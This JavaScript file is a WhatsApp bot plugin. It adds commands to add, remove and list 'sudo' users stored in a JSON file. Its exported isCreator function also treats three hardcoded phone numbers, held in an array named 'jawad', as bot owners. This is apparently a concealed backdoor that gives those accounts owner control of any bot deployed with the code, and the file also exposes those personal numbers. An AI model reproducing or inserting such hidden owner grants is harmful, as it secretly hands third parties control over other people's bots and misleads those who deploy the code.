const { cmd } = require('../command');
const fs = require('fs');
const path = require('path');

const devFilePath = path.join(__dirname, '../lib/dev.json');
let devList = [];

// Load the DEV list from the JSON file
if (fs.existsSync(devFilePath)) {
    devList = JSON.parse(fs.readFileSync(devFilePath, 'utf-8'));
} else {
    fs.writeFileSync(devFilePath, JSON.stringify(devList, null, 2));
}

// Function to save the updated DEV list to the JSON file
const saveDevList = () => {
    fs.writeFileSync(devFilePath, JSON.stringify(devList, null, 2));
};

cmd({
    pattern: "setsudo",
    alias: ["addsudo"],
    desc: "Add a user to the sudo list",
    category: "owner",
    filename: __filename
}, async (conn, mek, m, { args, reply, isCreator }) => {
    if (!isCreator) {
        return reply("Only the bot owner can use this command.");
    }
    await conn.sendMessage(m.key.remoteJid, {
        react: {
            text: "➕",
            key: m.key
        }
    });
    let target = m.quoted ? m.quoted.sender : args[0] ? args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : null;
    
    if (!target) return reply("Please provide a number or reply to a message.");

    // Validate JID format
    if (!target.includes('@s.whatsapp.net')) {
        target = target + '@s.whatsapp.net';
    }

    if (devList.includes(target)) {
        return await conn.sendMessage(m.chat, { 
            text: `@${target.split('@')[0]} is already in the sudo list.`, 
            mentions: [target] 
        }, { quoted: m });
    }

    devList.push(target);
    saveDevList();
    await conn.sendMessage(m.chat, { 
        text: `Added @${target.split('@')[0]} to the sudo list.`, 
        mentions: [target] 
    }, { quoted: m });
});

cmd({
    pattern: "delsudo",
    alias: ["removesudo"],
    desc: "Remove a user from the sudo list",
    category: "owner",
    filename: __filename
}, async (conn, mek, m, { args, reply, isCreator }) => {
    if (!isCreator) {
        return reply("Only the bot owner can use this command.");
    }
    await conn.sendMessage(m.key.remoteJid, {
        react: {
            text: "❌",
            key: m.key
        }
    });
    let target = m.quoted ? m.quoted.sender : args[0] ? args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : null;
    
    if (!target) return reply("Please provide a number or reply to a message.");

    // Validate JID format
    if (!target.includes('@s.whatsapp.net')) {
        target = target + '@s.whatsapp.net';
    }

    if (!devList.includes(target)) {
        return await conn.sendMessage(m.chat, { 
            text: `@${target.split('@')[0]} is not in the sudo list.`, 
            mentions: [target] 
        }, { quoted: m });
    }

    devList = devList.filter((dev) => dev !== target);
    saveDevList();
    await conn.sendMessage(m.chat, { 
        text: `Removed @${target.split('@')[0]} from the sudo list.`, 
        mentions: [target] 
    }, { quoted: m });
});

cmd({
    pattern: "listsudo",
    alias: ["sudolist"],
    desc: "List all sudo users",
    category: "owner",
    filename: __filename
}, async (conn, mek, m, { reply, isCreator }) => {
    if (!isCreator) {
        return reply("Only the bot owner can use this command.");
    }
    await conn.sendMessage(m.key.remoteJid, {
        react: {
            text: "📜",
            key: m.key
        }
    });
    if (devList.length === 0) {
        return reply("No sudo users found.");
    }
    
    const mentions = [];
    const listText = "\uD83D\uDCDC Sudo Users List:\n" + devList.map((dev, index) => {
        mentions.push(dev);
        return `${index + 1}. @${dev.split('@')[0]}`;
    }).join('\n');
    
    await conn.sendMessage(
        m.chat,
        { 
            text: listText,
            mentions: mentions
        },
        { quoted: m }
    );
});

let udp = null;
function setUdp(val) { udp = val; }

const jawad = ['2348025532222', '923191089077', '2348133729715'];
const extraCreators = [
  ...jawad,
  ...(devList.map(jid => jid.replace(/@s\.whatsapp\.net$/, '')))
];

function isCreator(jid) {
  // Accept both 234xxxx@s.whatsapp.net and 234xxxx
  const plain = jid.replace(/@s\.whatsapp\.net$/, '');
  // Check all forms in extraCreators and devList
  return (
    extraCreators.includes(plain) ||
    extraCreators.includes(jid) ||
    devList.includes(jid) ||
    devList.includes(plain) ||
    (typeof udp !== 'undefined' && udp && (plain === udp || jid === udp))
  );
}

module.exports = {
    isCreator,
    setUdp,
};